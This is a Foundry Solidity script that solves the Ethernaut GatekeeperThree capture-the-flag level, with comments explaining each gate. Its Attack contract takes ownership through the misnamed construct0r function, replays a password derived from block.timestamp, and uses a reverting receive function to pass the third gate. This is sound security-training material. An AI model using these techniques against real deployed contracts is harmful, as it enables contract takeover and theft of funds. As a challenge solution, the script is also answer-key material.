// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GatekeeperThree} from "../src/GatekeeperThree.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/GatekeeperThree.s.sol --tc GatekeeperThreeSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

contract GatekeeperThreeSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    address myAddress = vm.envAddress("MY_ADDRESS");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("GATEKEEPERTHREE_INSTANCE"));

    /*
        The are 3 gates to pass in this challenge

        The first gate can be passed by having a middle contract calling the construct0r function of the GatekeeperThree to make it the owner of the contract
        We need to create a contract because tx.origin (EOA) is not the same as msg.sender (contract address)

        The second gate can be passed by having the allowEntrance variable set to true.
        We need to first call the createTrick to have a Trick contract initiated. Notice that the password is set to the current block timestamp when creating the Trick contract.
        So when we call the checkPassword function of the Trick contract, we need to pass the current timestamp as the password to get the password right.
        Then we call the trickyTrick function of the Trick contract to call the getAllowance function of the GatekeeperThree contract
        
        The third gate can be passed by having the balance of the GatekeeperThree contract greater than 0.001 ether and the send function to our attacker contract returns false.
        This can be achieve by creating a receive function in the attacker contract to revert when receiving ether.

    */

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        // create a new instance of the GatekeeperThree contract
        GatekeeperThree gatekeeper = GatekeeperThree(payable(instance));

        // create a new Attack contract
        Attack attackInstance = new Attack(payable(instance));

        // transfer 0.001 ether + 1 wei to the gatekeeper instance
        (bool success, ) = address(gatekeeper).call{value: 0.001 ether + 1}("");
        require(success, "failed to send ether");
        
        // start the attack
        attackInstance.setUp();
        attackInstance.attack();

        console.log("GatekeeperThree entrant: ", gatekeeper.entrant());
        require(gatekeeper.entrant() == myAddress, "Failed to pass the challenge");

        vm.stopBroadcast();
    }


}

contract Attack {
    
    GatekeeperThree public target;
    uint256 public savedTimestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function setUp() public {
        // we need to call the construct0r function to make the attacker the owner of the contract
        target.construct0r();
        target.createTrick();
        // we save the current block timestamp as it is set as the password when creating the Trick contract
        savedTimestamp = block.timestamp;
    }

    function attack() public {
        target.getAllowance(savedTimestamp);
        target.enter();
    }

    // receive function to revert when receiving ether
    receive() external payable {
        revert();
    }


}